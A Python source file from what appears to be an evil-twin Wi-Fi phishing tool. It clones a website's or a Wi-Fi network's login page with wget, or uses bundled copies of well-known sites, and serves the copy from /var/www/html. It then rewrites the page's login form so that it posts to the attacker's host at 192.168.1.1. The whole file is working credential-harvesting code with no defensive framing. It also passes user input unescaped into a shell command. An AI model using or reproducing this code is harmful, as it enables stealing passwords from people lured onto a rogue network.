import subprocess
from pathlib import Path
import urllib.parse
from bs4 import BeautifulSoup
from sources import Sources
import time
import os
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET


class CaptivePortal:
    def __init__(self):
        self.main_url = None
        self.networkinterface = "wlan0"
        self.networkname = ""


    def setup_captive_portal(self):
            print(f"{GREEN}[+] CAPTIVE PORTAL SETTINGS::::: ")
            print("0. Captive Portal of Login Page of Website using URL of login page")
            print("1. Captive Portal Of a wifi network")
            print("2. Captive POrtal of Famous Websites (URL not required)")
            print("3. Want to place your own portal files in /var/www/html")
            print("4. Back.. \n")
            option = input(f"Select the option by typing corresponding index number: 0-4 --> {RESET}")
            if option == "0":
                self.captive_portal_by_url()
            elif option == "1":
                self.captive_portal_from_a_wifi()
            elif option == "2":
                self.captive_portal_of_famous_website()
            elif option == "3":
                self.own_portal_configure()


    def captive_portal_by_url(self):
        try:
            print(f"{BLUE}[!] Make sure you are connected to internet to Clone wesbite using url!!!! {RESET}")
            url = input(f"\n{GREEN} Please enter url of login page of website here:--> {RESET}")
            website_name = input(f"\n{GREEN} Please enter name for website to be saved in your computer. It could be random. :--> {RESET}")
            files_location = f'/var/www/html/'
            self.clone_website(url,files_location,website_name)
            urls = self.homepage_website_url(website_name)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")

    def captive_portal_from_a_wifi(self):
        try:
            # print(Sources().get_portal_ip())
            # time.sleep(10)
            network_config = Sources()
            website_name = input(f"\n{GREEN} Please enter name for website to be saved in your computer. It could be random. :--> {RESET}")
            network_config.connect_to_open_wifi(self.networkname,self.networkinterface)
            ip = network_config.get_ip_address(self.networkinterface)
            ip = ip.split(".")
            portal_ip = f"{ip[0]}.{ip[1]}.{ip[2]}.1"
            url = f"http://{portal_ip}/"
            files_location = f'/var/www/html/'
            self.clone_website(url,files_location,website_name)
            network_config.disconnect_to_open_wifi(self.networkinterface)
            time.sleep(1)
            os.system("clear")
            urls = self.homepage_website_url(website_name)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")



    def captive_portal_of_famous_website(self):
        try:
            sites = Sources().list_directory(f"{os.getcwd()}/src/sites/")
            os.system("clear")
            print("[++] Following Famous sites are available for Captive Portal:::::")
            for i in range(0, len(sites), 3):
                line = '\t\t\t '.join(f"{j}: {sites[j]}" for j in range(i, min(i + 3, len(sites))))
                print(line)

            select_website = int(input("[++] Following websites are available for captive portal. Select one by typing corresponding number: ---> "))
            website = sites[select_website]
            Sources().copy_directory(f"{os.getcwd()}/src/sites/{website}","/var/www/html/")
            urls = self.homepage_website_url(website)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")




    def own_portal_configure(self):
        try:
            print(f"\n {RED}[-][-]In order to configure your own website portal, Place all websites file in folder and Paste that folder in '/var/www/html'  .{RESET}\n")
            os.system("clear")
            result = Sources().list_directory('/var/www/html')
            website = int(input(f"{BLUE}[+]Your apache websites directory contain following website. Select the website by typing corresponding number to create captive using that directory: -->{RESET}"))
            urls = self.homepage_website_url(result[website])
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")


    def configuring_redirecting_index_file(self,urls):
        os.system("clear")
        if len(urls) == 1:
            self.main_url = f"/var/www/html{urls[0]}"
            url = urllib.parse.quote(urls[0], safe='/')
        else:
            i = 0
            for url in urls:
                print(f"{i}. {url}")
                i+=1
            url_select = input("Following Index files are found for website select the correct one that contain urls: ")
            if url_select == "":
                url_select = 0
            else:
                url_select = int(url_select)
            url = urllib.parse.quote(urls[url_select], safe='/')
            self.main_url = f"/var/www/html{urls[url_select]}"
        data = f'<!DOCTYPE html>\n<html lang="en">\n<head>\n\t<meta charset="UTF-8">\n\t<meta http-equiv="refresh" content="0; URL={url}">\n</head>\n<body>\n</body>\n</html>'
        html_file_path = "/var/www/html/index.html"
        Sources().create_file(html_file_path)

        try:
            with open(html_file_path, 'w') as f:
                f.write(data)
            print("[+]File " + html_file_path + " created successfully.")
        except IOError:
            print("Error: could not create file " + html_file_path)



    def configuring_main_index_file(self,file_path):
        ip_address = "192.168.1.1"

        with open(file_path, 'r', encoding='utf-8') as file:
            html_content = file.read()
            
        soup = BeautifulSoup(html_content, 'html.parser')
            
        form = soup.find('form')
        if form:
            form['action'] = f"http://{ip_address}/"
            
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(str(soup))



    def clone_website(self,website,path,website_name):
        print(f"{GREEN}\n[+] Cloning login page::::{RESET}")
        result = subprocess.run(f"wget -m -k -p '{website}' -P '{path}{website_name}'", shell=True, capture_output=True, text=True)
        if website_name in Sources().list_directory(path):
            print(f"{GREEN}\n[+][+] Website is cloned Succussfully in folder name {website_name} !!!!!!!{RESET}")
        else:
            print(f"{RED}\n[-][-] Due to some issues, website could not cloned successfully. Try Again by starting from beginning ---- {RESET}")
        time.sleep(1)

    def homepage_website_url(self,website):
        url = f"/var/www/html/{website}"
        print(url)
        paths = []
        for path in Path(url).rglob('*.html*'):
            path = str(path).split("/html")[1]
            paths.append(path)
        return paths


    